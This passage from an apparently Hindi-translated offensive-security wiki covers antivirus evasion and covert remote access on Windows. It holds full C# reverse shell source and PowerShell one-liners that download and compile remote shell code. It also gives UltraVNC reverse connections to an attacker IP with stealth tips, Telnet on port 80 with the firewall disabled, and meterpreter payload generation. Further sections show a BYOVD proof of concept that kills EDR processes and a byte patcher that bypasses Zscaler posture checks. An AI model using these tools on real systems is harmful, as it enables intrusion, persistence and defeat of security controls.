4. рджрд┐рдП рдЧрдП рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдХреБрдЫ рд╕рдорд╛рдпреЛрдЬрдиреЛрдВ рдХреЗ рд╕рд╛рде execute рдХрд░реЗрдВ: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (рдиреЛрдЯ: pin param рдЖрдкрдХреЛ GUI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдмрд┐рдирд╛ pin рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ).

## Advanced Evasion

Evasion рдПрдХ рдмрд╣реБрдд рдЬрдЯрд┐рд▓ рд╡рд┐рд╖рдп рд╣реИ, рдХрднреА-рдХрднреА рдЖрдкрдХреЛ рдПрдХ рд╣реА рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдХрдИ рдЕрд▓рдЧ-рдЕрд▓рдЧ telemetry рд╕реНрд░реЛрддреЛрдВ рдХреЛ рдзреНрдпрд╛рди рдореЗрдВ рд░рдЦрдирд╛ рдкрдбрд╝рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП mature environments рдореЗрдВ рдкреВрд░реА рддрд░рд╣ undetected рд░рд╣рдирд╛ рд▓рдЧрднрдЧ рдЕрд╕рдВрднрд╡ рд╣реИред

рд╣рд░ environment рдЬрд┐рд╕рдХреА рдЖрдк рд╕рдореАрдХреНрд╖рд╛ рдХрд░рддреЗ рд╣реИрдВ, рдЙрд╕рдХреЗ рдЕрдкрдиреЗ strengths рдФрд░ weaknesses рд╣реЛрдВрдЧреЗред

рдореИрдВ рдЖрдкрдХреЛ рдкреНрд░реЛрддреНрд╕рд╛рд╣рд┐рдд рдХрд░рддрд╛ рд╣реВрдБ рдХрд┐ рдЖрдк [@ATTL4S](https://twitter.com/DaniLJ94) рдХреА рдпрд╣ рдЯреЙрдХ рджреЗрдЦреЗрдВ, рддрд╛рдХрд┐ рдЖрдк Advanced Evasion рддрдХрдиреАрдХреЛрдВ рдореЗрдВ рдПрдХ foothold рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХреЗрдВред


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

рдпрд╣ [@mariuszbit](https://twitter.com/mariuszbit) рдХреА Evasion in Depth рдкрд░ рдПрдХ рдФрд░ рдмреЗрд╣рддрд░реАрди рдЯреЙрдХ рднреА рд╣реИред


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

рдЖрдк [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдмрд╛рдЗрдирд░реА рдХреЗ рд╣рд┐рд╕реНрд╕реЛрдВ рдХреЛ **рд╣рдЯрд╛** рджреЗрдЧрд╛ рдЬрдм рддрдХ рдХрд┐ рдпрд╣ **рдкрддрд╛ рди рд▓рдЧрд╛ рд▓реЗ рдХрд┐ Defender рдХрд┐рд╕ рд╣рд┐рд╕реНрд╕реЗ рдХреЛ malicious рдорд╛рди рд░рд╣рд╛ рд╣реИ** рдФрд░ рдЙрд╕реЗ рдЖрдк рддрдХ рд╡рд┐рднрд╛рдЬрди рдХрд░рдХреЗ рдкрд╣реБрдБрдЪрд╛ рджреЗрдЧрд╛ред\
рдПрдХ рдФрд░ рдЯреВрд▓ рдЬреЛ рдпрд╣реА рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рд╡рд╣ рд╣реИ [**avred**](https://github.com/dobin/avred) рдФрд░ рдЗрд╕рдХреА рд╕рд░реНрд╡рд┐рд╕ рд╡реЗрдм рдкрд░ рдЙрдкрд▓рдмреНрдз рд╣реИ [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Until Windows10, рд╕рднреА Windows рдореЗрдВ рдПрдХ **Telnet server** рдЖрддрд╛ рдерд╛ рдЬрд┐рд╕реЗ рдЖрдк (administrator рдХреЗ рд░реВрдк рдореЗрдВ) рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░ рд╕рдХрддреЗ рдереЗ рдХрд░рдХреЗ:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд╢реБрд░реВ рд╣реЛрддреЗ рд╣реА рдЗрд╕реЗ **start** рдХрд░рд╛рдПрдБ рдФрд░ рдЗрд╕реЗ рдЕрднреА **run** рдХрд░реЗрдВ:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet port рдмрджрд▓реЗрдВ** (stealth) рдФрд░ firewall рдХреЛ рдЕрдХреНрд╖рдо рдХрд░реЗрдВ:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

рдЗрд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (рдЖрдкрдХреЛ bin downloads рдЪрд╛рд╣рд┐рдП, setup рдирд╣реАрдВ)

**ON THE HOST**: _**winvnc.exe**_ рдХреЛ рдЪрд▓рд╛рдПрдБ рдФрд░ рд╕рд░реНрд╡рд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ:

- рд╡рд┐рдХрд▓реНрдк _Disable TrayIcon_ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ
- _VNC Password_ рдореЗрдВ рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗрдЯ рдХрд░реЗрдВ
- _View-Only Password_ рдореЗрдВ рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗрдЯ рдХрд░реЗрдВ

рдлрд┐рд░, рдмрд╛рдЗрдирд░реА _**winvnc.exe**_ рдФрд░ **рдирдпрд╛** рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдлрд╝рд╛рдЗрд▓ _**UltraVNC.ini**_ рдХреЛ **victim** рдХреЗ рдЕрдВрджрд░ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░реЗрдВред

#### **Reverse connection**

**attacker** рдХреЛ рдЕрдкрдиреЗ **host** рдкрд░ рдмрд╛рдЗрдирд░реА `vncviewer.exe -listen 5900` **рдЕрдВрджрд░ рдЪрд▓рд╛рдирд╛** рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рдпрд╣ reverse **VNC connection** рдкрдХрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП **рддреИрдпрд╛рд░** рд░рд╣реЗред рдлрд┐рд░, **victim** рдХреЗ рдЕрдВрджрд░: winvnc daemon `winvnc.exe -run` рд╢реБрд░реВ рдХрд░реЗрдВ рдФрд░ рдЪрд▓рд╛рдПрдБ `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** рдЧреБрдкреНрддрддрд╛ рдмрдирд╛рдП рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдХреБрдЫ рдЪреАрдЬрд╝реЗрдВ рдирд╣реАрдВ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП

- рдпрджрд┐ `winvnc` рдкрд╣рд▓реЗ рд╕реЗ рдЪрд▓ рд░рд╣рд╛ рд╣реИ рддреЛ рдЗрд╕реЗ рди рдЪрд▓рд╛рдПрдБ, рд╡рд░рдирд╛ рдЖрдк рдПрдХ [popup](https://i.imgur.com/1SROTTl.png) рдЯреНрд░рд┐рдЧрд░ рдХрд░ рджреЗрдВрдЧреЗред `tasklist | findstr winvnc` рд╕реЗ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдпрд╣ рдЪрд▓ рд░рд╣рд╛ рд╣реИ
- рдЙрд╕реА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ `UltraVNC.ini` рдХреЗ рдмрд┐рдирд╛ `winvnc` рди рдЪрд▓рд╛рдПрдБ рдЕрдиреНрдпрдерд╛ рдпрд╣ [the config window](https://i.imgur.com/rfMQWcf.png) рдЦреЛрд▓ рджреЗрдЧрд╛
- `winvnc -h` рдорджрдж рдХреЗ рд▓рд┐рдП рди рдЪрд▓рд╛рдПрдБ рд╡рд░рдирд╛ рдЖрдк рдПрдХ [popup](https://i.imgur.com/oc18wcu.png) рдЯреНрд░рд┐рдЧрд░ рдХрд░ рджреЗрдВрдЧреЗ

### GreatSCT

рдЗрд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT рдХреЗ рдЕрдВрджрд░:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
рдЕрдм **lister** рдХреЛ `msfconsole -r file.rc` рд╕реЗ рд╢реБрд░реВ рдХрд░реЗрдВ рдФрд░ **xml payload** рдХреЛ рдирд┐рдореНрдирд╛рдиреБрд╕рд╛рд░ **execute** рдХрд░реЗрдВ:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**рд╡рд░реНрддрдорд╛рди Defender рдмрд╣реБрдд рдЬрд▓реНрджреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕рдорд╛рдкреНрдд рдХрд░ рджреЗрдЧрд╛ред**

### рд╣рдорд╛рд░реА рдЕрдкрдиреА reverse shell рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдирд╛

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### рдкрд╣рд▓рд╛ C# Reverse shell

рдЗрд╕реЗ рдХрдВрдкрд╛рдЗрд▓ рдХрд░реЗрдВ:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
рдЗрд╕реЗ рдирд┐рдореНрди рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# рдХрдВрдкрд╛рдЗрд▓рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдбрд╛рдЙрдирд▓реЛрдб рдФрд░ рдирд┐рд╖реНрдкрд╛рджрди:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators рд╕реВрдЪреА: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### build injectors рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП python рдХрд╛ рдЙрдкрдпреЛрдЧ тАФ рдЙрджрд╛рд╣рд░рдг:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### рдЕрдиреНрдп tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### рдФрд░

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) тАУ Kernel Space рд╕реЗ AV/EDR рдХреЛ рдирд╖реНрдЯ рдХрд░рдирд╛

Storm-2603 рдиреЗ рдПрдХ рдЫреЛрдЯреА console utility рдЬрд┐рд╕реЗ **Antivirus Terminator** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдХрд╛ рдЙрдкрдпреЛрдЧ endpoint рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдбрд┐рд╕реЗрдмрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдерд╛ рдЗрд╕рд╕реЗ рдкрд╣рд▓реЗ рдХрд┐ рдпрд╣ ransomware рдбрд╛рд▓реЗред рдпрд╣ рдЯреВрд▓ рдЕрдкрдирд╛ **рдЦреБрдж рдХрд╛ vulnerable рдкрд░рдВрддреБ *signed* рдбреНрд░рд╛рдЗрд╡рд░** рд▓рд╛рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ privileged kernel рдСрдкрд░реЗрд╢рдиреНрд╕ рдЬрд╛рд░реА рдХрд░рддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ Protected-Process-Light (PPL) AV рд╕реЗрд╡рд╛рдПрдБ рднреА рдмреНрд▓реЙрдХ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреАрдВред

рдореБрдЦреНрдп рдмрд┐рдВрджреБ
1. **рд╕рд╛рдЗрди рдХрд┐рдП рдЧрдП рдбреНрд░рд╛рдЗрд╡рд░**: рдбрд┐рд╕реНрдХ рдкрд░ рдбрд┐рд▓реАрд╡рд░ рдХреА рдЧрдИ рдлрд╛рдЗрд▓ `ServiceMouse.sys` рд╣реИ, рд▓реЗрдХрд┐рди рдмрд╛рдЗрдирд░реА рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ Antiy Labs рдХреЗ тАЬSystem In-Depth Analysis ToolkitтАЭ рдХрд╛ рд╡реИрдз рд░реВрдк рд╕реЗ рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рд╣реБрдЖ рдбреНрд░рд╛рдЗрд╡рд░ `AToolsKrnl64.sys` рд╣реИред рдХреНрдпреЛрдВрдХрд┐ рдбреНрд░рд╛рдЗрд╡рд░ рдкрд░ рдорд╛рдиреНрдп Microsoft рд╕рд┐рдЧреНрдиреЗрдЪрд░ рд╣реИ, рдпрд╣ рддрдм рднреА рд▓реЛрдб рд╣реЛрддрд╛ рд╣реИ рдЬрдм Driver-Signature-Enforcement (DSE) рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИред
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
рдкрд╣рд▓реА рд▓рд╛рдЗрди рдбреНрд░рд╛рдЗрд╡рд░ рдХреЛ рдПрдХ **kernel service** рдХреЗ рд░реВрдк рдореЗрдВ рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░рддреА рд╣реИ рдФрд░ рджреВрд╕рд░реА рд▓рд╛рдЗрди рдЗрд╕реЗ рд╢реБрд░реВ рдХрд░ рджреЗрддреА рд╣реИ рддрд╛рдХрд┐ `\\.\ServiceMouse` user land рд╕реЗ рдкрд╣реБрдБрдЪ рдпреЛрдЧреНрдп рд╣реЛ рдЬрд╛рдПред
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID рджреНрд╡рд╛рд░рд╛ рдХрд┐рд╕реА рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕рдорд╛рдкреНрдд рдХрд░рдирд╛ (Defender/EDR рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рдЦрддреНрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛) |
| `0x990000D0` | рдбрд┐рд╕реНрдХ рдкрд░ рдХрд┐рд╕реА рднреА рдлрд╛рдЗрд▓ рдХреЛ рдбрд┐рд▓реАрдЯ рдХрд░рдирд╛ |
| `0x990001D0` | рдбреНрд░рд╛рдЗрд╡рд░ рдХреЛ рдЕрдирд▓реЛрдб рдХрд░рдирд╛ рдФрд░ рд╕рд░реНрд╡рд┐рд╕ рдХреЛ рд╣рдЯрд╛рдирд╛ |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **рдХреНрдпреЛрдВ рдпрд╣ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ**: BYOVD рдкреВрд░реА рддрд░рд╣ рд╕реЗ user-mode рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рд╕реНрдХрд┐рдк рдХрд░ рджреЗрддрд╛ рд╣реИ; kernel рдореЗрдВ ьЛдэЦЙ рд╣реЛрдиреЗ рд╡рд╛рд▓рд╛ рдХреЛрдб *protected* processes рдХреЛ рдЦреЛрд▓ рд╕рдХрддрд╛ рд╣реИ, рдЙрдиреНрд╣реЗрдВ рд╕рдорд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдпрд╛ kernel рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЗ рд╕рд╛рде рдЫреЗрдбрд╝рдЫрд╛рдбрд╝ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЪрд╛рд╣реЗ PPL/PP, ELAM рдпрд╛ рдЕрдиреНрдп hardening рд╕реБрд╡рд┐рдзрд╛рдПрдБ рдореМрдЬреВрдж рд╣реЛрдВред

рдкрддрд╛ рд▓рдЧрд╛рдиреЗ / рдирд┐рд╡рд╛рд░рдг
тАв  Microsoft рдХреА vulnerable-driver block list (`HVCI`, `Smart App Control`) рдХреЛ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ рддрд╛рдХрд┐ Windows `AToolsKrnl64.sys` рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рд╕реЗ рдЗрдирдХрд╛рд░ рдХрд░ рджреЗред  
тАв  рдирдП *kernel* рд╕рд░реНрд╡рд┐рд╕реЗрд╕ рдХреЗ рдирд┐рд░реНрдорд╛рдг рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░реЗрдВ рдФрд░ рдЕрд▓рд░реНрдЯ рдХрд░реЗрдВ рдЬрдм рдХрд┐рд╕реА world-writable рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реЗ рдбреНрд░рд╛рдЗрд╡рд░ рд▓реЛрдб рд╣реЛ рдпрд╛ рд╡рд╣ allow-list рдкрд░ рдореМрдЬреВрдж рди рд╣реЛред  
тАв  custom device objects рдХреЗ рд▓рд┐рдП user-mode handles рдФрд░ рдЙрд╕рдХреЗ рдмрд╛рдж suspicious `DeviceIoControl` рдХреЙрд▓реНрд╕ рдкрд░ рдирдЬрд╝рд░ рд░рдЦреЗрдВред

### Zscaler Client Connector Posture Checks рдХреЛ On-Disk Binary Patching рдХреЗ рджреНрд╡рд╛рд░рд╛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдирд╛

ZscalerтАЩs Client Connector рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ device-posture rules рд▓рд╛рдЧреВ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдкрд░рд┐рдгрд╛рдореЛрдВ рдХреЛ рдЕрдиреНрдп рдХрдВрдкреЛрдиреЗрдВрдЯреНрд╕ рддрдХ рдкрд╣реБрдБрдЪрд╛рдиреЗ рдХреЗ рд▓рд┐рдП Windows RPC рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред рджреЛ рдХрдордЬреЛрд░ рдбрд┐рдЬрд╛рдЗрди рд╡рд┐рдХрд▓реНрдк рдПрдХ рдкреВрд░реНрдг рдмрд╛рдИрдкрд╛рд╕ рд╕рдВрднрд╡ рдмрдирд╛рддреЗ рд╣реИрдВ:

1. Posture evaluation рдкреВрд░реА рддрд░рд╣ client-side рдкрд░ рд╣реЛрддрд╛ рд╣реИ (рдПрдХ boolean рд╕рд░реНрд╡рд░ рдХреЛ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ)ред  
2. Internal RPC endpoints рдХреЗрд╡рд▓ рдпрд╣ рдорд╛рдиреНрдп рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ connecting executable **Zscaler рджреНрд╡рд╛рд░рд╛ рд╕рд╛рдЗрди** рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ (via `WinVerifyTrust`)ред

рдбрд┐рд╕реНрдХ рдкрд░ рдЪрд╛рд░ signed binaries рдХреЛ рдкреИрдЪ рдХрд░рдХреЗ рджреЛрдиреЛрдВ рдореЗрдХреИрдирд┐рдЬреНрдо рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

| рдмрд╛рдЗрдирд░реА | рдореВрд▓ рд▓реЙрдЬрд┐рдХ рдореЗрдВ рдкреИрдЪ | рдкрд░рд┐рдгрд╛рдо |
|--------|-------------------|--------|
| `ZSATrayManager.exe` | `devicePostureCheck() тЖТ return 0/1` | рд╣рдореЗрд╢рд╛ `1` рд░рд┐рдЯрд░реНрди рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╣рд░ рдЪреЗрдХ compliant рд╣реЛ |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed тЗТ рдХреЛрдИ рднреА (рдпрд╣рд╛рдБ рддрдХ рдХрд┐ unsigned) process RPC pipes рдХреЛ bind рдХрд░ рд╕рдХрддрд╛ рд╣реИ |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` рд╕реЗ рдмрджрд▓рд╛ рдЧрдпрд╛ |
| `ZSATunnel.exe` | Tunnel рдкрд░ integrity checks | Short-circuited |

рдиреНрдпреВрдирддрдо рдкреИрдЪрд░ рдЕрдВрд╢:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **рд╕рднреА** рдкреЛрдЬрд╝рдЪрд░ рдЪреЗрдХреНрд╕ **рд╣рд░реЗ/рдЕрдиреБрдкрд╛рд▓рдХ** рджрд┐рдЦрддреЗ рд╣реИрдВред
* рдЕрдирд╕рд╛рдЗрди рдХрд┐рдП рдЧрдП рдпрд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдмрд╛рдЗрдирд░реА рдирд╛рдорд┐рдд-рдкрд╛рдЗрдк RPC endpoints рдЦреЛрд▓ рд╕рдХрддреЗ рд╣реИрдВ (рдЙрджрд╛. `\\RPC Control\\ZSATrayManager_talk_to_me`)ред
* рд╕рдордЭреМрддрд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛрд╕реНрдЯ Zscaler рдиреАрддрд┐рдпреЛрдВ рджреНрд╡рд╛рд░рд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдЖрдВрддрд░рд┐рдХ рдиреЗрдЯрд╡рд░реНрдХ рддрдХ рдмрд┐рдирд╛ рдкреНрд░рддрд┐рдмрдВрдз рдХреЗ рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд▓реЗрддрд╛ рд╣реИред

рдпрд╣ рдХреЗрд╕ рд╕реНрдЯрдбреА рджрд┐рдЦрд╛рддреА рд╣реИ рдХрд┐ рдХреИрд╕реЗ рдХреЗрд╡рд▓ рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдЯреНрд░рд╕реНрдЯ рдирд┐рд░реНрдгрдп рдФрд░ рд╕рд╛рдзрд╛рд░рдг рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдЬрд╛рдБрдЪ рдХреБрдЫ рдмрд╛рдЗрдЯ рдкреИрдЪреЗрд╕ рд╕реЗ рдкрд░рд╛рдЬрд┐рдд рдХрд┐рдпреЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

